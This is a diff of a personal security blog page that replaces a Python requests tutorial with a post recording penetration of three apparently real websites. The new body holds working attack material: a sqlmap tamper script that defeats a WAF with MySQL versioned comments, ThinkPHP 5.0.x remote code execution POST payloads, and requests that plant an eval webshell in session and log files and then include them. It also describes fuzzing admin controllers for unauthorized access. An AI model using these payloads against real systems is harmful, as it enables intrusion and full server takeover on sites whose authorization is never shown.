@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="python中requests库一些注意事项, 个人blog,信息安全学习记录,生活,学习">
+    <meta name="keywords" content="最近一些渗透实战记录, 个人blog,信息安全学习记录,生活,学习">
     <meta name="description" content="信息安全学习记录">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>python中requests库一些注意事项 | EASY</title>
+    <title>最近一些渗透实战记录 | EASY</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://picbed.easy233.top//imgimage-20210418100253115.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://picbed.easy233.top//imgimage-20210429163617691.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">python中requests库一些注意事项</h1>
+                    <h1 class="description center-align post-title">最近一些渗透实战记录</h1>
                 </div>
             </div>
         </div>
@@ -444,8 +444,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/">
-                                <span class="chip bg-color">安全工具开发</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                <span class="chip bg-color">漏洞挖掘</span>
                             </a>
                         
                     </div>
@@ -460,7 +460,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-18
+                    2021-04-29
                 </div>
                 
 
@@ -476,36 +476,111 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近使用requests库的时候发现了一些以前自已没有注意到的问题，这里记录一下。</p>
-<h2 id="爬虫乱码问题"><a href="#爬虫乱码问题" class="headerlink" title="爬虫乱码问题"></a>爬虫乱码问题</h2><h3 id="text方法的缺陷"><a href="#text方法的缺陷" class="headerlink" title=".text方法的缺陷"></a>.text方法的缺陷</h3><p>首先我们思考一下Python-requests中的.content和.text方法的区别。</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单记录最近几个实战渗透的站点。</p>
+<h2 id="第一个站点"><a href="#第一个站点" class="headerlink" title="第一个站点"></a>第一个站点</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>收到Xray的sql注入告警。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429163617691.png" alt=""></p>
+<p>简单测试了一下确实存在数字型注入，但是存在waf检测到sql注入一些关键词直接403</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429163922552.png" alt=""></p>
+<p>经过测试只是检测关键词，这个时候我们可以考虑</p>
 <ul>
-<li>.text 返回的是Beautifulsoup根据猜测的编码方式将content内容编码成字符串。</li>
-<li>.content 返回的是bytes字节码</li>
+<li>使用生僻函数代替所在检测的关键词。</li>
+<li>使用注释扰乱waf的正则匹配。</li>
 </ul>
-<p>注意<code>.text</code>是根据 Content-Type中的<code>charset</code>字段自动获取编码的。如下图</p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418100253115.png" alt=""></p>
-<p>但是如果不存在<code>Content-Type</code>头则默认为<code>ISO-8859-1</code>这就解释了为什么爬取某些页面使用<code>.text</code>获取结果会返回中文乱码的问题。例如百度首页的爬虫请求如下，如果不加<code>user-agent</code>头不会放回正确的<code>Content-Type</code>头使用了默认的编码方式<code>ISO-8859-1</code> 导致了中文乱码。</p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418100638953.png" alt=""></p>
-<h3 id="正确的解码方法"><a href="#正确的解码方法" class="headerlink" title="正确的解码方法"></a>正确的解码方法</h3><p>如下代码:</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<p>这里我使用内联注释<code>/*!....*/</code>进行fuzz测试。</p>
+<blockquote>
+<p>当!后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。</p>
+</blockquote>
+<p>不填充版本号被拦截</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429165450992.png" alt=""></p>
+<p>随便填充版本号注意不要填太大，成功绕过，看来是一个很弱的waf。。。。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429165631186.png" alt=""></p>
+<p>利用mysql的注释来对抗waf的正则匹配非常有效因为其太过于灵活如下:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429165939474.png" alt=""></p>
+<h3 id="编写tamper脚本"><a href="#编写tamper脚本" class="headerlink" title="编写tamper脚本"></a>编写tamper脚本</h3><p>太懒了手工是不可能的了，直接编写tamper脚本来跑。写的过程发现了sqlmap集成了一个类似的<code>versionedmorekeywords.py</code>。</p>
+<p>进行简单修改一下就行</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
 
-rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>
-rsp<span class="token punctuation">.</span>encoding <span class="token operator">=</span> rsp<span class="token punctuation">.</span>apparent_encoding <span class="token keyword">if</span> rsp<span class="token punctuation">.</span>encoding <span class="token operator">==</span> <span class="token string">'ISO-8859-1'</span> <span class="token keyword">else</span> rsp<span class="token punctuation">.</span>encoding
-<span class="token keyword">print</span><span class="token punctuation">(</span>rsp<span class="token punctuation">.</span>encoding<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>rsp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>rsp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>rsp<span class="token punctuation">.</span>encoding<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
-<p><code>apparent_encoding</code>会从网页的内容中分析网页编码的方式，所以<code>apparent_encoding</code>比<code>encoding</code>更加准确。我们可用使用<code>apparent_encoding</code> 方法解码，便能获取到更加准确的结果</p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418102158765.png" alt=""></p>
-<h2 id="Https请求问题"><a href="#Https请求问题" class="headerlink" title="Https请求问题"></a>Https请求问题</h2><p>Requests会为HTTPS请求验证SSL证书，参数为verify默认为True。如果一些网站SSL证书验证不通过，或者不信任服务器的安全证书，则会报出SSLError。如果我们直接请求会报一个<code>SSLError</code>错误</p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418102932604.png" alt=""></p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418102856100.png" alt=""></p>
-<p>这时候我们需要把 verify 设置为 False 就可以正常请求了但是还是触发警告</p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418103212475.png" alt=""></p>
-<p>requests 的底层实现其实就是 urllib3我们可以在开头添加如下代码把警告给关了。</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib3
-urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>最终效果:</p>
-<p><img src="https://picbed.easy233.top//imgimage-20210418103437443.png" alt=""></p>
+<span class="token triple-quoted-string string">"""
+Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""</span>
+
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> re
+
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data <span class="token keyword">import</span> kb
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>settings <span class="token keyword">import</span> IGNORE_SPACE_AFFECTED_KEYWORDS
+
+__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHER
+
+<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    singleTimeWarnMessage<span class="token punctuation">(</span><span class="token string">"tamper script '%s' is only meant to be run against %s >= 5.1.13"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> DBMS<span class="token punctuation">.</span>MYSQL<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Encloses each keyword with (MySQL) versioned comment
+
+    Requirement:
+        * MySQL >= 5.1.13
+
+    Tested against:
+        * MySQL 5.1.56, 5.5.11
+
+    Notes:
+        * Useful to bypass several web application firewalls when the
+          back-end database management system is MySQL
+
+    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
+    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
+    """</span>
+
+    <span class="token keyword">def</span> <span class="token function">process</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        word <span class="token operator">=</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">'word'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> word<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> kb<span class="token punctuation">.</span>keywords <span class="token operator">and</span> word<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token keyword">in</span> IGNORE_SPACE_AFFECTED_KEYWORDS<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token string">"/*!50011%s*/"</span> <span class="token operator">%</span> word<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    retVal <span class="token operator">=</span> payload
+
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        retVal <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>r<span class="token string">"(?&lt;=\W)(?P&lt;word>[A-Za-z_]+)(?=\W|\Z)"</span><span class="token punctuation">,</span> process<span class="token punctuation">,</span> retVal<span class="token punctuation">)</span>
+        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" /*!"</span><span class="token punctuation">,</span> <span class="token string">"/*!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"*/ "</span><span class="token punctuation">,</span> <span class="token string">"*/"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> retVal
+</code></pre>
+<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>测试的脚本一直都跑不出来，使用-v3参数看了一遍又一遍payload应该是没有问题但是就是检测不到注入。最终抓包查看才知道如来是waf检测到了sqlmap的特征直接ban掉了。使用<code>--random-agent</code>构造随机user-agent并且降低线程就成功跑出数据了。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429171613120.png" alt=""></p>
+<h2 id="第二个站点"><a href="#第二个站点" class="headerlink" title="第二个站点"></a>第二个站点</h2><h3 id="thinkphp-rce"><a href="#thinkphp-rce" class="headerlink" title="thinkphp rce"></a>thinkphp rce</h3><p>这个没什么好说的，thinkphp5.0.x的Rce:</p>
+<pre><code>POST:_method=__construct&amp;method=get&amp;filter[]=phpinfo&amp;get[]=-1</code></pre><p><img src="https://picbed.easy233.top//imgimage-20210429194120099.png" alt=""></p>
+<p>这里主要提一下如何Getshell。从phpinfo页面泄漏的信息目标操作系统为linux，php版本7.2.6，并且禁用了常见执行命令的函数。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429194422071.png" alt=""></p>
+<p>这里我们可以考虑:</p>
+<ul>
+<li>包含session文件Getshell</li>
+<li>包含日志文件Getshell。</li>
+</ul>
+<p>一般可以优先考虑包含session文件Getshell进行Getshell，包含日志文件的话有可能因为日志文件过大而包含失败。</p>
+<p>首先查看session文件保存位置，这里为空在linux下如果为空则默认保存在/tmp下。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429195044153.png" alt=""></p>
+<p>写木马进sesion中:</p>
+<pre><code>设置cookie为:Cookie: PHPSESSID=test
+POST:_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;get[]=&lt;?php eval($_POST[&#39;EASY2132&#39;])?&gt;</code></pre><p><img src="https://picbed.easy233.top//imgimage-20210429194953234.png" alt=""></p>
+<p>然后使用文件包含:</p>
+<pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/tmp/sess_test&amp;server[]=1&amp;EASY2132=phpinfo();</code></pre><p><img src="https://picbed.easy233.top//imgimage-20210429195617775.png" alt=""></p>
+<p><strong>写入日志Getshell的方法:</strong></p>
+<p>首先确定日志文件位置:</p>
+<p>thinkphp日志命名格式:文件夹年+月份/天.log</p>
+<pre><code>_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=../runtime/log/202011/07.log</code></pre><p>写shell到日志中:</p>
+<pre><code>_method=__construct&amp;filter[]=call_user_func&amp;method=GET&amp;get[]=&lt;?php eval($_POST[&#39;c&#39;]);?&gt;</code></pre><p>日志包含:</p>
+<pre><code>_method=__construct&amp;filter[]=think\\__include_file&amp;method=GET&amp;get[]=../runtime/log/202011/07.log&amp;c=phpinfo();</code></pre><h2 id="第三个站点"><a href="#第三个站点" class="headerlink" title="第三个站点"></a>第三个站点</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>同样是一个基于thinkphp框架开发的网站，在渗透TP开发的网站除了优先考虑其框架本身的漏洞以及日志泄漏以外我们可以Fuzz后台一些控制器。</p>
+<p>例如:</p>
+<pre><code>xxx/index.php/Admin/Manage/loginPic</code></pre><p>这里我们可以对loginPic进行Fuzz控制器名称，如果后台某些控制器权限控制不严格，可能会有未授权的产生。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429201950436.png" alt=""></p>
+<p><img src="https://picbed.easy233.top//imgimage-20210429202210631.png" alt=""></p>
 
             </div>
             <hr/>
@@ -531,7 +606,7 @@ urllib3<span class="token punctuation">.</span>disable_warnings<span class="toke
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.easy233.top/2021/04/18/python-zhong-requests-ku-shi-yong-zhu-yi-zhi-nan/">https://www.easy233.top/2021/04/18/python-zhong-requests-ku-shi-yong-zhu-yi-zhi-nan/</a>
+                    <a href="https://www.easy233.top/2021/04/29/shen-tou-shi-li/">https://www.easy233.top/2021/04/29/shen-tou-shi-li/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -569,8 +644,8 @@ urllib3<span class="token punctuation">.</span>disable_warnings<span class="toke
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/">
-                                    <span class="chip bg-color">安全工具开发</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                    <span class="chip bg-color">漏洞挖掘</span>
                                 </a>
                             
                         </div>
@@ -738,9 +813,10 @@ urllib3<span class="token punctuation">.</span>disable_warnings<span class="toke
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/04/29/shen-tou-shi-li/">
                     <div class="card-image">
@@ -764,9 +840,9 @@ urllib3<span class="token punctuation">.</span>disable_warnings<span class="toke
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -775,6 +851,7 @@ urllib3<span class="token punctuation">.</span>disable_warnings<span class="toke
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -793,24 +870,26 @@ urllib3<span class="token punctuation">.</span>disable_warnings<span class="toke
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/14/shu-ju-cai-ji-gong-ju-gather/">
+                <a href="/2021/04/18/python-zhong-requests-ku-shi-yong-zhu-yi-zhi-nan/">
                     <div class="card-image">
                         
-                        <img src="https://picbed.easy233.top//img0.jpg" class="responsive-img" alt="数据采集工具-Gather">
+                        <img src="https://picbed.easy233.top//imgimage-20210418100253115.png" class="responsive-img" alt="python中requests库一些注意事项">
                         
-                        <span class="card-title">数据采集工具-Gather</span>
+                        <span class="card-title">python中requests库一些注意事项</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言Gather是一个数据采集工具，使用python3编写，使用的时候请确保运行环境为python3.6以上。Gather支持Fofa，钟馗之眼(Zoomeye),Shodan的数据采集。
-使用说明Gather极力避免各种繁杂的参数，使用-
+                            前言最近使用requests库的时候发现了一些以前自已没有注意到的问题，这里记录一下。
+爬虫乱码问题.text方法的缺陷首先我们思考一下Python-requests中的.content和.text方法的区别。
+
+.text 返回的是Bea
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-18
                             </span>
                         <span class="publish-author">
                             
